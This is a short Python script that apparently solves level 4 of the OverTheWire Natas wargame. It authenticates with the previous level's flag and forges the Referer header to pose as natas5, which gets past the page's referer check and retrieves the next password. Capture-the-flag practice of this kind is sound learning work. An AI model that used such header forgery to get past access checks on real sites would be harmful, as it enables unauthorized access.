import requests, natas, natas3

URL = 'http://natas4.natas.labs.overthewire.org/'
USER = 'natas4'
PASS = natas3.flag
auth_basic = requests.auth.HTTPBasicAuth(USER, PASS)

header = {'Referer': 'http://natas5.natas.labs.overthewire.org/'}

flag = natas.get_flag(URL, auth_basic, header)

if __name__ == '__main__':
    print(natas.msg, flag)